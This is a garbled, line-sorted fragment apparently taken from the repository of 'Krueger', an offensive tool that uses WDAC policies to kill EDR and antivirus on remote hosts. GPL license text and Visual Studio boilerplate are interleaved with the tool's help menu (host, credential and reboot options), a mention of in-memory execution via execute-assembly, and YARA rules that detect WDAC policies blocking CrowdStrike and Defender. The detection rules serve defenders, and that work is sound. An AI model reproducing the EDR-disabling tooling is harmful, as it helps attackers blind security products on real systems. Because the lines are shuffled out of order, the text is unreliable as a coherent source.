+"requirement to continue to provide support service, warranty, or updates"
+"restriction, you may remove that term.  If a license document contains"
+"restrictions"" within the meaning of section 10.  If the Program as you"
+"rights granted or affirmed under this License.  For example, you may"
+"rights granted under this License, and you may not initiate litigation"
+"rights of fair use or other equivalent, as provided by copyright law."
+"sale, or importing the Program or any portion of it."
+"section 13, concerning interaction through a network will apply to the"
+"software for all its users.  We, the Free Software Foundation, use the"
+"software on general-purpose computers, but in those that do, we wish to"
+"source code form), and must require no special password or key for"
+"specifically for use in, a User Product, and the conveying occurs as"
+"standard defined by a recognized standards body, or, in the case of"
+"sue for patent infringement).  To ""grant"" such a patent license to a"
+"tangible personal property which is normally used for personal, family,"
+"terms of section 4, provided that you also meet all of these conditions:"
+"than the work as a whole, that (a) is included in the normal form of"
+"the ""copyright"" line and a pointer to where the full notice is found."
+"the Program, the only way you could satisfy both those terms and this"
+"the covered work, and you disclaim any intention to limit operation or"
+"the interface presents a list of user commands or options, such as a"
+"the library.  If this is what you want to do, use the GNU Lesser General"
+"the scope of its coverage, prohibits the exercise of, or is"
+"the source code needed to generate, install, and (for an executable"
+"the work, and the source code for shared libraries and dynamically"
+"the work, and under which the third party grants, to any of the"
+"them if you wish), that you receive source code or can get it if you"
+"these rights or asking you to surrender the rights.  Therefore, you have"
+"to copy, free of charge and under the terms of this License, through a"
+"to receive a copy likewise does not require acceptance.  However,"
+"to take away your freedom to share and change the works.  By contrast,"
+"typical or common use of that class of product, regardless of the status"
+"under those permissions, but the entire Program remains governed by"
+"unpacking, reading or copying."
+"use, which is precisely where it is most unacceptable.  Therefore, we"
+"users, your or third parties' legal rights to forbid circumvention of"
+"versions of the GNU General Public License can be used, that proxy's"
+"violation by some reasonable means, this is the first time you have"
+"want it, that you can change the software or use pieces of it in new"
+"which are not part of the work.  For example, Corresponding Source"
+"with facilities for running those works, provided that you comply with"
+"work results from an entity transaction, each party to that"
+"work thus licensed is called the contributor's ""contributor version""."
+"work under this License, and how to view a copy of this License.  If"
+"work) run the object code and to modify the work, including scripts to"
+"works, such as semiconductor masks."
+"works, which are not by their nature extensions of the covered work,"
+"xml version=""1.0"" encoding=""utf-8"" "
+"xml version=""1.0"" encoding=""utf-8"""
+"your programs, too."
+"{username}:{password}"")"
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$blockbytes = { FF FF FF FF FF FF FF FF }
+$enforcebyte = { 8C }
+$filesignature = { 07 00 00 00 0E }
+$filesignature at 0x00 and ($blockbytes at 0xE0 or $blockbytes at 0xF8) and $enforcebyte at 0x26
+$wdac1 = { 0E 37 44 A2 C9 44 06 4C B5 51 F6 01 6E 56 30 76 }  /
+(  /
+(including a cross-claim or counterclaim in a lawsuit) alleging that
+(such as an express permission to practice a patent or covenant not to
+) and
+) and 
+) or
+.DS_Store
+.user
+/                  
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// associated with an assembly.
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+/_____/      
+0TJ-
+</OutputPath>
+</Project>
+</configuration>
+<configuration>
+<https://www.gnu.org/licenses/>.
+<https://www.gnu.org/licenses/why-not-lgpl.html>.
+APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
+Additional permissions that are applicable to the entire Program shall
+Also add information on how to contact you by electronic and paper mail.
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+CodeIntegrity
+Corresponding Source conveyed under this section must be accompanied
+DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
+Debug
+ENFORCED_BLOCKING_WDAC_POLICY and any of ($blockexe
+EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
+EndGlobal
+EndGlobalSection
+EndProject
+Foundation.  If the Program does not specify a version number of the
+GNU General Public License for most of our software
+Global
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HideSolutionNode = FALSE
+Krueger can also be run from memory using tools such as 
+License by making exceptions from one or more of its conditions.
+License of the Program or a work on which the Program is based.  The
+License would be to refrain entirely from conveying the Program.
+MinimumVisualStudioVersion = 10.0.40219.1
+More information about this technique can be found on our blog at: [https://beierle.win/2024-12-19-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/](https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/)
+PTbS
+PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
+Program specifies that a certain numbered version of the GNU General
+Release
+SUCH DAMAGES.
+Source.
+States should not allow patents to restrict development and use of
+System32
+THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
+TRACE</DefineConstants>
+The hypothetical commands 
+USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
+User Product is transferred to the recipient in perpetuity or for a
+VisualStudioVersion = 17.0.31903.59
+Windows
+[Bb]in/
+[Dd]ebug/
+[Oo]bj/
+[Rr]elease/
+[assembly: ComVisible(false)]
+] Impersonated {domain}
+_  __ 
+_/ __ 
+___  >__
+___  >___  / 
+____
+____/  
+______ __ __   ____   ____   ___________ 
+a further restriction but permits relicensing or conveying under this
+a modified version of its Corresponding Source.  The information must
+address new problems or concerns.
+adversely affects the operation of the network or violates the rules and
+all of ($wdac
+an absolute waiver of all civil liability in connection with the
+and execute modified versions of a covered work in that User Product from
+and the Corresponding Source of the work is not available for anyone
+and you may offer support or warranty protection for a fee.
+any implied license or other defenses to infringement that may
+any of ($policydst
+any of ($s
+any other work released this way by its authors.  You can apply it to
+appropriately publish on each copy an appropriate copyright notice
+author or copyright holder as a result of your choosing to follow a
+authors of previous versions.
+avoid the special danger that patents applied to a free program could
+been installed in ROM).
+beyond what the individual works permit.  Inclusion of a covered work
+but do not include claims that would be infringed only as a
+by the Free Software Foundation.
+by the Installation Information.  But this requirement does not apply
+can do so.  This is fundamentally incompatible with the aim of
+can regenerate automatically from other parts of the Corresponding
+circumvention of technological measures to the extent such circumvention
+code is in no case prevented or interfered with solely because
+combination as such.
+condition:
+conditioned on the non-exercise of one or more of the rights that are
+conditions are met.  This License explicitly affirms your unlimited
+consequence of further modification of the contributor version.  For
+copy of the Program in return for a fee.
+country that you have reason to believe are valid.
+covered work so as to satisfy simultaneously your obligations under this
+documented (and with an implementation available to the public in
+doubtful cases shall be resolved in favor of coverage.  For a particular
+excuse you from the conditions of this License.  If you cannot convey a
+execute-assembly
+for and in connection with specific products or compilations that
+for enforcing compliance by third parties with this License.
+for which you have or can give appropriate copyright permission.
+form of a work.
+free software which everyone can redistribute and change under these terms.
+governed by this License along with a term that is a further
+have designed this version of the GPL to prohibit the practice for those
+have the freedom to distribute copies of free software (and charge for
+holder fails to notify you of the violation by some reasonable means
+if neither you nor any third party retains the ability to install
+implementation is available to the public in source code form.  A
+in accord with this section must be in a format that is publicly
+in an aggregate does not cause this License to apply to the other
+in force.  You may convey covered works to others for the sole purpose
+in one of these ways:
+included in conveying the object code work.
+includes interface definition files associated with source files for
+inlineExecute-Assembly
+is a consumer product regardless of whether the product has substantial
+is effected by exercising rights under this License with respect to
+is widely used among developers working in that language.
+it.  (Additional permissions may be written to require their own
+keep intact all notices of the absence of any warranty
+keep intact all notices stating that this License and any
+know their rights.
+later version.
+license from a particular copyright holder is reinstated (a)
+licenses of parties who have received copies or rights from you under
+licenses to the work the party's predecessor in interest had or could
+makes it unnecessary.
+material under section 10.
+may consider it more useful to permit linking proprietary applications with
+measure under any applicable law fulfilling obligations under article
+measures.
+meta :
+meta:
+might be different
+modification follow.
+modification has been made.
+modify any covered work.  These actions infringe copyright if you do
+n        
+n@_logangoins
+n@hullabrian
+nV0v
+namespace Krueger
+namespace Krueger.Modules
+network may be denied when the modification itself materially and
+non-permissive terms added in accord with section 7 apply to the code
+not control copyright.  Those thus making or running the covered works
+not survive such relicensing or conveying.
+nothing other than this License grants you permission to propagate or
+notice like this when it starts in an interactive mode:
+occurring solely as a consequence of using peer-to-peer transmission
+of the particular user or of the way in which the particular user
+on the Program.
+option of following the terms and conditions either of that numbered
+or can get the source code.  And you must show them these terms so they
+otherwise be available to you under applicable patent law.
+paragraph of section 11).
+part of a transaction in which the right of possession and use of the
+parties to make or receive copies.  Mere interaction with a user through
+parts of the aggregate.
+party means to make such an agreement or commitment not to enforce a
+patent against the party.
+patent license (a) in connection with copies of the covered work
+patent sublicenses in a manner consistent with the requirements of
+patents cannot be used to render the program non-free.
+pattern of such abuse occurs in the area of products for individuals to
+permission to link or combine any covered work with a work licensed
+permission to run the unmodified Program.  The output from running a
+price.  Our General Public Licenses are designed to make sure that you
+prior to 60 days after the cessation.
+private rule ENFORCED_BLOCKING_WDAC_POLICY {
+programs which are used unmodified in performing those activities but
+propagate the contents of its contributor version.
+protecting users' freedom to change the software.  The systematic
+protocols for communication across the network.
+provided under this License.  Any attempt otherwise to propagate or
+public statement of acceptance of a version permanently authorizes you
+received notice of violation of this License (for any work) from that
+recipients a copy of this License along with the Program.
+reinstated permanently if the copyright holder notifies you of the
+removal in certain cases when you modify the work.)  You may place
+reviewing courts shall apply local law that most closely approximates
+rule BLOCK_CROWDSTRIKE {
+rule BLOCK_WINDOWS_DEFENDER {
+rule KRUEGER {
+run a copy of the Program.  Ancillary propagation of a covered work
+same work.
+share and change all versions of a program--to make sure it remains free
+show c' for details.
+show c' should show the appropriate
+show w' and 
+show w'.
+similar laws prohibiting or restricting circumvention of such
+software and other kinds of works.
+specifically granted under this License.  You may not convey a covered
+stand ready to extend this provision to those domains in future versions
+state the exclusion of warranty
+strings:
+subprograms and other parts of the work.
+such as by intimate data communication or control flow between those
+suffice to ensure that the continued functioning of the modified object
+t--domain <domain>        -     A domain to use for authentication
+t--host <hostname>        -     Kill EDR on a specified host
+t--password <password>    -     A password to use for authentication
+t--prompt                 -     Display a prompt the device will reboot in 2 minutes
+t--username <username>    -     A username to use for authentication
+t-h/--help                -     Display this help menu
+technological measures.
+tells the user that there is no warranty for the work (except to the
+that material) supplement the terms of this License with terms:
+that there is no warranty for this free software.  For both users' and
+that they are valid under applicable law.  If additional permissions
+the GNU General Public License from time to time.  Such new versions will
+the GNU General Public License is intended to guarantee your freedom to
+the User Product in which it has been modified or installed.  Access to a
+the above requirements apply either way.
+the conditions stated below.  Sublicensing is not allowed
+the only significant mode of use of the product.
+the predecessor has it or can get it with reasonable efforts.
+the terms of this License in conveying all material for which you do
+then you must either (1) cause the Corresponding Source to be so
+this License (including any patent licenses granted under the third
+this License without regard to the additional permissions.
+this License.
+this License.  If your rights have been terminated and not permanently
+to attach them to the start of each source file to most effectively
+to choose that version for the Program.
+to collect a royalty for further conveying from those to whom you convey
+to the extent that it includes a convenient and prominently visible
+to the third party based on the extent of your activity of conveying
+transaction who receives a copy of the work also receives whatever
+under version 3 of the GNU Affero General Public License into a single
+used to limit the access or legal rights of the compilation's users
+using System
+using System.Collections.Generic
+using System.ComponentModel
+using System.DirectoryServices
+using System.DirectoryServices.ActiveDirectory
+using System.IO
+using System.Linq
+using System.Management
+using System.Net.Configuration
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Runtime.Remoting.Contexts
+using System.Security.Principal
+using System.Text
+using System.Threading.Tasks
+version or of any later version published by the Free Software
+wdac1 >= 3
+where to find the applicable terms.
+work and works based on it.
+work if you are a party to an arrangement with a third party that is
+you grant is automatically extended to all recipients of the covered
+you modify it: responsibilities to respect the freedom of others.
+your copyrighted material outside their relationship with you.
+your receipt of the notice.
+{022E5A85-D732-4C5D-8CAD-A367139068D8}.Debug
+{022E5A85-D732-4C5D-8CAD-A367139068D8}.Release
